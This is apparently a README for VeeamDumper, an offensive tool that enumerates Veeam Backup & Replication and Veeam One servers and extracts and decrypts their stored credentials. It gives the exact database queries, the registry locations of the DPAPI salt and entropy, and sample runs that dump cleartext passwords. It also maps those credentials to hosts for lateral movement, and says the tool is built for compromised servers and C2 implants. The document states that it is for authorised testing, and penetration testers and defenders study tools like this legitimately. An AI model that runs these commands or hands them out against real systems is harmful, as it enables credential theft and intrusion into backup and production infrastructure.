
# VeeamDumper

**VeeamDumper** is a C# command-line utility designed to enumerate and extract stored credentials from:
- Veeam Backup & Replication (VBR)
- Veeam One

The tool was created as a .NET assembly to be executed as a stand-alone binary on a compromised Veeam server. Whilst Veeam's documentation (https://www.veeam.com/kb4349) does provide details on how to obtain the cleartext credentials with PowerShell, we wanted to automate this process in such a way that it could also be executed in an implant of a C2 framework as part of post-exploitation activities. The Beacon Object File (BOF) implementation can be found at https://github.com/MWR-CyberSec/VeeamDumper-BOF. 

> [!warning]
> This tool is intended for authorised security assessments, incident response, and internal recovery scenarios only. Use strictly within environments you own or have explicit permission to test.

```
==================================================================
|                                                                |
|                        *(((((((((((((.                         |
|                   (((((((((((((((((((((((((                    |
|                (((((((((((((((((/(((((((((((((                 |
|             ((((((((((((((((,(((((((((((((((((((               |
|           *((((((((((((( *((((((((((((((((((((((               |
|          ((((((((((((  ((((((((((((((((((((((((    ..          |
|         (((((((((((  ((((               ((((       &&          |
|        *((((((((*  ,                              &&&,         |
|        ((((((((            /&&&&&&&&&,           &&&&&         |
|        ((((((            &&&&&&&&&&&           .&&&&&&         |
|        (((((           ,&&&&&&&&&.            &&&&&&&&         |
|        *(((                             *   &&&&&&&&&,         |
|         ((      .&&&&               %&&&  &&&&&&&&&&%          |
|          .    &&&&&&&&&&&&&&&&&&&&&&&% ,&&&&&&&&&&&%           |
|              &&&&&&&&&&&&&&&&&&&&&&..&&&&&&&&&&&&&.            |
|              &&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&/              |
|                &&&&&&&&&&&&%%&&&&&&&&&&&&&&&&&                 |
|                   %&&&&&&&&&&&&&&&&&&&&&&&%                    |
|                         &&&&&&&&&&&&&                          |
|                                                                |
==================================================================
|                    V E E A M   D U M P E R                     |
==================================================================
Usage: VeeamDumper.exe <action> [options]


Actions:
  enum         Enumerate Veeam configuration
  auto         Automatically enumerate the configuration and extract credentials
  mssql        Extract Veeam credentials from MSSQL database
  psql         Extract Veeam credentials from PostgreSQL database
  map          Map credentials to specific targets [Experimental]

Options:
  -v <dbName>      Override Veeam database name (default: VeeamBackup)
  -m <sqlcmdPath>  Override path to sqlcmd.exe
  -p <psqlPath>    Override path to psql.exe
  -l               Enumerate usernames of credentials stored in the database
  -u <username>    Decrypt credentials for only a specific user in the database
  -o               Target Veeam One instead of Veeam Backup and Replication
  -d               Enable debug output for all steps
  -h, --help       Show this help menu

Examples:
  VeeamDumper.exe enum
  VeeamDumper.exe auto
  VeeamDumper.exe mssql
  VeeamDumper.exe mssql -l
  VeeamDumper.exe mssql -o
  VeeamDumper.exe mssql -u "administrator@vsphere.local"
  VeeamDumper.exe mssql -v VeeamBackup2017 -m "C:\Tools\sqlcmd.exe" -d
  VeeamDumper.exe psql
  VeeamDumper.exe psql -l
  VeeamDumper.exe psql -u "administrator@vsphere.local"
  VeeamDumper.exe psql -v VeeamBackup2016 -p "C:\PostgreSQL\15\bin\psql.exe" -d
  VeeamDumper.exe map
  VeeamDumper.exe map -o
```



The tool supports extracting credentials from both Microsoft SQL Server (MSSQL) and PostgreSQL (PSQL) databases depending on the configuration of the Veeam installation. After retrieving the encrypted credentials from the Veeam database, the tool decrypts them using DPAPI mechanisms and registry-derived material (`EncryptionSalt` / `Entropy`).

## Features

- **ENUM** -- Enumerate the host for information relevant to the tool. This module will identify paths for the `sqlcmd.exe` and `psql.exe` binaries, identify database processes, and perform Windows Registry enumeration for the Veeam installation type and configuration thereof. 
- **AUTO** -- Automatically performs enumeration to identify the Veeam installation type, database software, and then subsequently decrypts all available credential material stored in the database. 
- **MSSQL/PSQL** -- Provides a more fine-grained approach to extracting credentials from an MSSQL or PSQL database. These modules provide the ability to list all available users without performing any decryption, as well as target a specific user on which to perform decryption. 
- **MAP** -- Performs a database query to map the stored credentials, to the hosts where they are used. This provides an indication of where these credentials could be used to gain access to sensitive systems or to perform additional lateral movement. 

The following describes at a high-level how the VeeamDumper tooling works:

### Database Access

The tool uses uses legitimate database client binaries already present on the server to execute database queries, however the binaries can also be manually uploaded and their paths supplied via the `-m` and `-p` flags. 
- Executes `sqlcmd.exe` for MSSQL
- Executes `psql.exe` for PostgreSQL
- Parses colon-delimited output

### Registry Access

The tool reads configuration and cryptographic material from the following Windows Registry locations depending on the type of Veeam installation being targeted. 

**Veeam Backup & Replication:** 
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\SqlActiveConfiguration`
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql\SQLInstanceName`
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql\SqlDatabaseName`
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql\PostgresUserForWindowsAuth`
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql\SqlDatabaseName` 
- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\Data\EncryptionSalt`

**Veeam One**
- `HKLM\SOFTWARE\Veeam\Veeam ONE\DatabaseName`
- `HKLM\SOFTWARE\Veeam\Veeam ONE\DatabaseServer`
- `HKLM\SOFTWARE\Veeam\Veeam ONE\Private\Entropy`

### Decryption Methods

All decryption uses the following to obtain the DPAPI key with the different formats listed in the table below depending on the encryption algorithm used:
- `System.Security.Cryptography.ProtectedData.Unprotect`

|Format|Method|
|---|---|
|A|DPAPI LocalMachine|
|V|DPAPI LocalMachine + EncryptionSalt|
|ONE|DPAPI LocalMachine + Entropy|

## Usage

```
VeeamDumper.exe <action> [options]
```

### Actions

| Action  | Description                                                    |
| ------- | -------------------------------------------------------------- |
| `enum`  | Enumerate Veeam configuration and environment                  |
| `auto`  | Automatically detect configuration and extract all credentials |
| `mssql` | Fine-grained extraction of credentials from MSSQL database     |
| `psql`  | Fine-grained extraction of credentials from PSQL database      |
| `map`   | Map credentials to hosts in the environment                    |

### Options

|Option|Description|
|---|---|
|`-v <dbName>`|Override database name (default: VeeamBackup)|
|`-m <sqlcmdPath>`|Override sqlcmd.exe path|
|`-p <psqlPath>`|Override psql.exe path|
|`-l`|List usernames only (no decryption)|
|`-u <username>`|Extract specific user only|
|`-o`|Target Veeam ONE instead of VBR|
|`-d`|Enable debug output|
|`-h`, `--help`|Show help menu|

## Examples

The following sections describe example usage of the VeeamDumper tooling for extracting cleartext credentials with sample output:

### Enumerate the Veeam Configuration
```
.\VeeamDumper.exe enum

=====================================
|     RUNNING VEEAM ENUMERATION     |
=====================================
[INFO] psql.exe binaries found:
  - C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Database detection summary:
  - PostgreSQL process detected (postgres.exe running)
  - MSSQL process not detected
[INFO] Registry enumeration:
  - Database type found in Registry: PostgreSql
  - PSQL username: postgres
  - PSQL database: VeeamBackup
```
### Auto Mode on Veeam Backup and Replication
```
.\VeeamDumper.exe auto

=====================================
|       VEEAM AUTO EXTRACTION       |
=====================================
[INFO] Veeam Backup and Replication Registry Entries Exist: True
[INFO] Veeam One Registry Entries Exist: False
[INFO] Performing Veeam Backup and Replication Extraction
[INFO] Database type found in Registry: PostgreSql
  - PSQL username: postgres
  - PSQL database: VeeamBackup
  - PostgreSQL binary: C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Running command: C:\Program Files\PostgreSQL\17\bin\psql.exe -d VeeamBackup -U postgres -A -F : -c "SELECT user_name,password,description FROM credentials;"
=====================================
|        JUICY CREDS LOADING        |
=====================================
Username   : Administrator
Password   : Password456!
Description: Administrator of VeeamOne Server
---------------------------------------------
Username   : LocalAdmin
Password   : VeeamB@ckup@cc0unt!1
Description: LocalAdmin account to perform backup jobs
---------------------------------------------
```
### Auto Mode on Veeam One
```
.\VeeamDumper.exe auto

=====================================
|       VEEAM AUTO EXTRACTION       |
=====================================
[INFO] Veeam Backup and Replication Registry Entries Exist: False
[INFO] Veeam One Registry Entries Exist: True
[INFO] Performing Veeam One Extraction
[INFO] Loaded Veeam One Entropy value (32 bytes)
[INFO] Veeam One info found in Registry:
  - Database name found in Registry: VeeamONE
  - Database server found in Registry: .\VEEAMSQL2017
[INFO] Running command: sqlcmd.exe -S .\VEEAMSQL2017 -E -d VeeamONE -Q "SELECT username,password,description FROM [monitor].[Credentials];" -s":" -y 0 -Y 0
=====================================
|        JUICY CREDS LOADING        |
=====================================
Username   : svc_vcenter_backup
Password   : B@nkB4ckup2026!
Description: vCenter service account used for production VM backups
---------------------------------------------
Username   : CORP\svc_sql_alwayson
Password   : SQL!Prod#7742
Description: Domain service account for SQL AlwaysOn Availability Group backups
---------------------------------------------
Username   : oracle_backup_core
Password   : 0racle$Core26!
Description: Oracle user for core banking database backups
---------------------------------------------
```
### List Usernames Stored in Veeam Database
```
.\VeeamDumper.exe psql -l
[INFO] PostgreSQL binary: C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Database: VeeamBackup
[INFO] Running command: C:\Program Files\PostgreSQL\17\bin\psql.exe -d VeeamBackup -U postgres -A -F : -c "SELECT user_name,description FROM credentials;"
=====================================
|           LISTING USERS           |
=====================================
Username   : user_name
Description: description
---------------------------------------------
Username   : root
Description: Helper appliance credentials
---------------------------------------------
Username   : root
Description: Tenant-side network extension appliance credentials
---------------------------------------------
Username   : root
Description: Azure helper appliance credentials
---------------------------------------------
Username   : root
Description: Provider-side network extension appliance credentials
---------------------------------------------
Username   : Administrator
Description: Administrator of VeeamOne Server
---------------------------------------------
Username   : LocalAdmin
Description: LocalAdmin account to perform backup jobs
---------------------------------------------
```
### Extract and Decrypt All Credentials Stored in Veeam Database
```
.\VeeamDumper.exe psql

[INFO] PostgreSQL binary: C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Database: VeeamBackup
[INFO] Running command: C:\Program Files\PostgreSQL\17\bin\psql.exe -d VeeamBackup -U postgres -A -F : -c "SELECT user_name,password,description FROM credentials;"
=====================================
|        JUICY CREDS LOADING        |
=====================================
Username   : Administrator
Password   : Password123!
Description: Administrator of VeeamOne Server
---------------------------------------------
Username   : LocalAdmin
Password   : VeeamB@ckup@cc0unt!1
Description: LocalAdmin account to perform backup jobs
---------------------------------------------
```
### Target a Specific User for Extracting and Decrypting Credentials
```
.\VeeamDumper.exe psql -u "LocalAdmin"

[INFO] PostgreSQL binary: C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Database: VeeamBackup
[INFO] Running command: C:\Program Files\PostgreSQL\17\bin\psql.exe -d VeeamBackup -U postgres -A -F : -c "SELECT user_name,password,description FROM credentials where user_name ILIKE 'LocalAdmin';"
=====================================
|        JUICY CREDS LOADING        |
=====================================
Username   : LocalAdmin
Password   : VeeamB@ckup@cc0unt!1
Description: LocalAdmin account to perform backup jobs
---------------------------------------------
```
### Target Veeam One instead of Veeam Backup and Replication
```
.\VeeamDumper.exe mssql -o

[INFO] MSSQL instance: VeeamSQL2017
[INFO] Database: VeeamONE
[INFO] Sqlcmd.exe path: sqlcmd.exe
[INFO] Loaded Veeam One Entropy value (32 bytes)
[INFO] Running command: sqlcmd.exe -S .\VeeamSQL2017 -E -d VeeamONE -Q "SELECT username,password,description FROM [monitor].[Credentials];" -s":" -y 0 -Y 0
=====================================
|        JUICY CREDS LOADING        |
=====================================
Username   : svc_vcenter_backup
Password   : B@nkB4ckup2026!
Description: vCenter service account used for production VM backups
---------------------------------------------
Username   : CORP\svc_sql_alwayson
Password   : SQL!Prod#7742
Description: Domain service account for SQL AlwaysOn Availability Group backups
---------------------------------------------
Username   : oracle_backup_core
Password   : 0racle$Core26!
Description: Oracle user for core banking database backups
---------------------------------------------
Username   : CORP\azure_backup_svc
Password   : AzureDR!9041
Description: Azure subscription service account for cloud workload backups
---------------------------------------------
Username   : netapp_backup
Password   : NetApp_Rep1!
Description: NetApp storage snapshot and replication account
```

### Map Credentials to Hosts on Veeam Backup and Replication
```
.\VeeamDumper.exe map

=====================================
|        MAPPING CREDENTIALS        |
=====================================
[INFO] Database type found in Registry: PostgreSql
  - PSQL username: postgres
  - PSQL database: VeeamBackup
  - PostgreSQL binary: C:\Program Files\PostgreSQL\17\bin\psql.exe
[INFO] Running command: C:\Program Files\PostgreSQL\17\bin\psql.exe -d VeeamBackup -U postgres -A -F : -t -c "SELECT t1.user_name,STRING_AGG(t2.name, ', ') as hosts FROM credentials AS t1 INNER JOIN EPContainers AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;"

===============================================
Username         Hosts
===============================================
Administrator    > 192.168.56.38
                 > 192.168.56.39
-----------------------------------------------
LocalAdmin       > 192.168.56.89
-----------------------------------------------
```
### Map Credentials to Hosts on Veeam One
```
.\VeeamDumper.exe map -o

=====================================
|        MAPPING CREDENTIALS        |
=====================================
[INFO] Veeam One info found in Registry:
  - Database name found in Registry: VeeamONE
  - Database server found in Registry: .\VEEAMSQL2017
[INFO] Running command: sqlcmd.exe -S .\VEEAMSQL2017 -E -d VeeamONE -Q "SELECT t1.username,STRING_AGG(t3.host_name, ', ') as hosts FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id GROUP BY t1.username ORDER BY t1.username;" -s":" -y 0 -Y 0

===============================================
Username         Hosts
===============================================
Administrator    > 192.168.56.39
-----------------------------------------------
```
